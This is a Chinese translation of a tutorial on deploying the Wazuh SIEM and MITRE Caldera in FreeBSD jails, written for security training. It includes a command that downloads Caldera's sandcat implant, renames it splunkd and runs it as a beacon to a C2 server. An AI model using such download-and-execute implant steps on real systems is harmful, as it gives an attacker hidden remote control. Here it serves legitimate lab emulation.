# Wazuh 和 MITRE Caldera 在 FreeBSD Jail 中的使用

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/bae8f84a-e2c2-4762-9e32-537ee2b0616b)


- 原文链接：<https://freebsdfoundation.org/wp-content/uploads/2023/11/Cardenas.pdf>
- 作者：ALONSO CÁRDENAS
- 译者：Canvis-Me & ChatGPT

在信息安全管理中，每天都需要越来越多支持实施控制的基础设施。组织中最常用的工具之一是 SIEM（安全信息与事件管理）。SIEM 通过在集中地点收集和分析普通消息、警告通知和日志文件，帮助实时识别攻击或攻击趋势。

此外，由于需要为企业中支持安全管理的团队提供持续的技术培训，因此传统的培训方法需要辅之以可模拟攻击（红队）和帮助培训事件响应团队（蓝队）的工具。

FreeBSD 为我们提供了支持信息安全控制实施的各种活动的应用程序和工具。Jail 是 FreeBSD 的一个强大特性，能让你创建隔离的环境，非常适合与信息安全或网络安全相关的任务，帮助保持干净的主机环境，使用脚本或工具（如 AppJail）自动化部署任务，模拟安全环境以进行分析，并使用测试工具最快地部署安全解决方案。

在这篇文章中，我们将专注于部署两个开源工具，当结合使用时，可以补充由红队和蓝队执行的培训练习。它基于《使用 CALDERA 和 [Wazuh](https://wazuh.com/blog/adversary-emulation-with-caldera-and-wazuh/) 进行对抗仿真》这篇文章，但使用了 FreeBSD、AppJail（Jail 管理）、Wazuh 和 MITRE Caldera。

这项工作的主要目标是增强 FreeBSD 作为信息安全或网络安全有用平台的可见性。

## Wazuh

[Wazuh](https://wazuh.com/) 是一个用于威胁预防、检测和响应的免费开源平台。它能够在本地、虚拟化、容器化和基于云的环境中保护工作负载。Wazuh 解决方案包括部署到受监视系统的端点安全代理以及由代理收集和分析的数据的管理服务器。Wazuh 的特点包括与 [Elastic Stack](https://www.elastic.co/elastic-stack/) 和 [OpenSearch](https://opensearch.org/) 的完全集成，提供搜索引擎和数据可视化工具，用户可通过这些工具浏览安全警报。

Wazuh 在 FreeBSD 上的移植是由 [Michael Muenz](mailto:m.muenz@gmail.com) 发起的。他在 2021 年 9 月首次将 Wazuh 添加到 ports 中，命名为 [security/wazuh-agent](https://cgit.freebsd.org/ports/tree/security/wazuh-agent/)。在 2022 年 7 月，我接手了该 port 的维护，并开始移植其他 Wazuh 组件。

目前，所有的 Wazuh 组件都已移植或修改：[security/wazuh-manager](https://cgit.freebsd.org/ports/tree/security/wazuh-manager/)、[security/wazuh-agent](https://cgit.freebsd.org/ports/tree/security/wazuh-agent/)、[security/wazuh-server](https://cgit.freebsd.org/ports/tree/security/wazuh-server/)、[security/wazuh-indexer](https://cgit.freebsd.org/ports/tree/security/wazuh-indexer/) 和 [security/wazuh-dashboard](https://cgit.freebsd.org/ports/tree/security/wazuh-dashboard/)。

在 FreeBSD 上，security/wazuh-manager 和 security/wazuh-agent 是从 Wazuh 源代码编译而来的。security/wazuh-indexer 是一个经过修改的 textproc/opensearch，用于存储代理数据。security/wazuh-server 包含了适用于 FreeBSD 的对配置文件的修改。运行时依赖项包括 security/wazuh-manager、sysutils/beats7（filebeat）和 sysutils/logstash8。security/wazuh-dashboard 使用了一个经过修改的 textproc/opensearch-dashboards，以及来自 wazuh-kibana-app 源代码为 FreeBSD 生成的 wazuh-kibana-app 插件。

## MITRE Caldera

[MITRE Caldera](https://caldera.mitre.org/) 是一个旨在轻松自动化对抗仿真、协助手动红队行动并自动化事件响应的网络安全平台。它建立在 MITRE ATT&CK© 框架上，是 MITRE 的一项积极研究项目。

MITRE Caldera（[security/caldera](https://cgit.freebsd.org/ports/tree/security/caldera/)）于 2023 年 4 月加入了 ports 树。该 port 包括对 [MITRE Caldera 原子插件](https://github.com/mitre/atomic)使用的 [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) 项目的支持。

## AppJail

[AppJail](https://github.com/DtxdF/AppJail) 是一个完全由 sh(1) 和 C 编写的框架，用于使用 FreeBSD Jail 创建隔离的、便携的、易于部署的环境，这些环境行为类似于应用程序。AppJail 的一个有趣特性是 [AppJail-Makejails](https://github.com/AppJail-makejails) 格式。它是一个文本文档，包含构建 jail 的所有指令。Makejail 是构建 jail、配置它、安装应用程序、配置它们等等的进程的另一抽象层。

## 准备

在进行 Wazuh 和 MITRE Caldera 部署之前，有一些最低要求需要处理。在本文中，我使用 FreeBSD 14.0-RC1-amd64 作为主机系统 `# pkg install appjail-devel #` 以包含 AppJail 添加的最新功能。

将锚点放入 pf.conf 中：

```
# cat << “EOF” >> /etc/pf.conf
nat-anchor ‘appjail-nat/jail/*’
nat-anchor “appjail-nat/network/*”
rdr-anchor “appjail-rdr/*”
EOF
```

启用数据包过滤器

```
# pfctl -f /etc/pf.confg -e
```

启用 IP 转发

```
sysctl net.inet.ip.forwarding=1
```

是时候下载创建 jail 所需的文件。默认情况下，AppJail 下载与主机相同版本和架构的文件。

```
# appjail fetch
```

如果我们想要指定特定的版本，我们必须使用以下方法：

```
# appjail fetch www -v 13.2-RELEASE -a amd64
```

我们添加了一个名为 wazuh-net 的网络。wazuh-net 桥将用于 jail。

```
# appjail network add wazuh-net 11.1.0.0/24
# appjail network list

NAME NETWORK CIDR BROADCAST GATEWAY MINADDR MAXADDR ADDRESSES DESCRIPTION
wazuh-net 11.1.0.0 24 11.1.0.255 11.1.0.1 11.1.0.1 11.1.0.254 254 -
```

## 部署

### 部署 Wazuh AIO（全一体）

Wazuh makejail 将创建并配置一个 jail，其中包含 Wazuh SIEM 使用的所有组件（wazuh-manager、wazuh-server、wazuh-indexer 和 wazuh-dashboard）。目前在 ports 中为 4.5.2 版本。

使用 AppJail 通过 AppJail-Makejail 创建它。

```
# appjail makejail -f gh+alonsobsd/wazuh-makejail -o osversion 13.2-RELEASE -j wazuh -- --network wazuh-net --server_ip 11.1.0.2
```

完成后，我们将看到为 wazuh-dashboard 生成的凭据，以及在以下示例中用于将代理添加到 wazuh-manager 的密码：

```
################################################
Wazuh dashboard admin credentials
Hostname  :  https://jail-host-ip:5601/app/wazuh
Username  :  admin
Password  :  @vCX46vMSaNUAf5WQ
################################################
Wazuh agent enrollment password
Password  :  @ugEwZHpUJ8a7oCsc1rxJKd3/hlk=
################################################
```

检查 wazuh-dashboard 服务是否就绪。尝试使用 Web 浏览器连接到 `https://11.1.0.2:5601/app/wazuh`。

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/4b1770db-6891-4fbe-8c1d-fac3dc4cfc77)

### 部署 Wazuh 代理

如果 wazuh-dashboard 在线，我们将继续向基础架构添加一些代理。为此，我们将使用 wazuh-agent AppJail-Makejail 和先前生成的 Wazuh 代理注册密码。

```
-f use a AppJail-Makejail from a github repository
-o for define which version of FreeBSD will be used to create the jail, otherwise it uses the host version
-j jail name
```

以下参数已在 Makejail 文件中定义：

```
--network network name used by jail
--agent_ip IP address assigned to jail
--agent_name name of wazuh-agent
--server_ip wazuh-manager IP address
--enrollment agents enrollment password

# appjail makejail -f gh+alonsobsd/wazuh-agent-makejail -o osversion=13.2-RELEASE
-j agent01 -- --network wazuh-net --agent_ip 11.1.0.3 --agent_name agent01 --server_ip 11.1.0.2 --enrollment @ugEwZHpUJ8a7oCsc1rxJKd3/hlk=
```

对于每个代理（agent01、agent02、agent03、agent04 和 agent05），重复此命令，使用不同的 IP 地址（11.1.0.3、11.1.0.4、11.1.0.5 和 11.1.0.6），并更改系统版本（13.2-RELEASE 或 14.0-RC1）。完成后，我们将能够在 wazuh-dashboard 的 "Agents" 窗口中查看已连接代理的列表。

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/d1e97b28-d360-4cf1-b23a-b1dee48d1365)

最后，在每个代理上安装 `net/curl`。此工具将用于下载与 MITRE Caldera 进行交互的有效负载。

```
# appjail pkg jail agent01 install curl
```

### 部署 MITRE Caldera

与之前的操作类似，我们继续使用 Caldera AppJail-Makejail 创建 jail。

```
-f use a AppJail-Makejail from a github repository
-o for define which version of FreeBSD will be used to create the jail, otherwise it uses the host version
-j jail name
```

以下参数已在 Makejail 文件中定义：

```
--network network name used by jail
--caldera_ip IP address assigned to jail

# appjail makejail -f gh+alonsobsd/caldera-makejail -o osversion=13.2-RELEASE -j caldera -- --network wazuh-net --caldera_ip 11.1.0.10
```

就像 wazuh 的创建和配置过程一样，它将在以下示例中显示为 MITRE Caldera 生成的凭据：

```
################################################
MITRE Caldera admin credential
Hostname  :  https://jail-host-ip:8443
Username  :  admin
Password  :  Z1EtVnltRtirHDOTVY4=
################################################

################################################
MITRE Caldera blue credential
Hostname  :  https://jail-host-ip:8443
Username  :  blue
Password  :  M0WmJnQOLG3va+b0LM8=
################################################

################################################
MITRE Caldera red credential
Hostname  :  https://jail-host-ip:8443
Username  :  red
Password  :  1TPza2NLp0h1scaZ2uA=
################################################
```

测试 MITRE Caldera 服务是否就绪。尝试使用 Web 浏览器连接到 `https://11.1.0.2:8443/`。

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/1b7f5324-4c36-460d-8d7b-626783d54b01)

如果 MITRE Caldera 服务在线，我们继续在每个代理上下载并运行 sandcat 载荷。通过这样做，MITRE Caldera 将能够在每个 jail 中运行测试。

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/89a8df9a-ea9f-4297-9fc9-2ee0aab53a70)

```
# appjail cmd jexec agent01 sh -c ‘curl -k -s -X POST -H “file:sandcat.go” -H
“platform:freebsd” https://11.1.0.10:8443/file/download > /root/splunkd’
# appjail cmd jexec agent01 chmod 750 /root/splunkd
# appjail cmd jexec agent01 ./splunkd -server https://11.1.0.10:8443 -group red -v

Starting sandcat in verbose mode.
[*] No tunnel protocol specified. Skipping tunnel setup.
[*] Attempting to set channel HTTP
Beacon API=/beacon
[*] Set communication channel to HTTP
initial delay=0
server=https://11.1.0.10:8443
upstream dest addr=https://11.1.0.10:8443
group=red
privilege=Elevated
allow local p2p receivers=false
beacon channel=HTTP
available data encoders=base64, plain-text
[+] Beacon (HTTP): ALIVE
```

在不同的终端会话中，为每个代理重复前面的命令，只更改 jail 的名称（agent01、agent02、agent03、agent04 和 agent05）。完成这些任务后，我们将在 MITRE Caldera Agents 窗口中看到可用代理的列表。

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/b79764a5-9fdd-4958-b280-bd8ebf284c46)

添加（潜在的链接按钮）并在不同的代理上运行一些模拟测试。以下四个测试将在 wazuh-manager 中生成警报：

1) Cron – 用引用的文件替换 crontab（T1053.003）
2) 使用 `root` GID 在 FreeBSD 中创建一个新用户（T1136.001）
3) 在 FreeBSD 系统上创建一个用户帐户（T1136.001）
4) 创建本地帐户（FreeBSD）（T1078.003）

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/924b5db2-9145-4dff-8f28-e240ae93e37d)

完成模拟操作后，我们在 wazuh-dashboard 控制台中验证每个测试生成的警报。

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/ca6fb0fd-64c4-4730-a532-2d54c5753dad)

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/620548ed-980e-49d6-acd9-a73bd9a6f1e5)

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/77e60ce8-b4f7-4477-a401-1190cc47a2a7)

![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/7d0c2a6d-e0d2-4c9e-9a93-d78a7199bf8c)

## 结论

Wazuh 和 MITRE Caldera 提供了可定制的工具，以适应安全信息或网络安全需求。本文展示了包含在 Wazuh SIEM 和 MITRE Caldera 中的部分功能。如果你想了解更多关于这些工具的信息，Wazuh 项目和 MITRE Caldera 项目提供了出色的文档（<https://documentation.wazuh.com/current/index.html>）和（<https://caldera.readthedocs.io/en/latest/>），以及强大的社区支持。

AppJail 在快速将本文使用的工具部署到 jail 容器中发挥了作用。。

---

ALONSO CÁRDENAS 是 FreeBSD 项目的 ports 提交者。他最近专注于提升 FreeBSD 作为信息安全有用平台的可见性。他是秘鲁的信息安全和网络安全顾问。
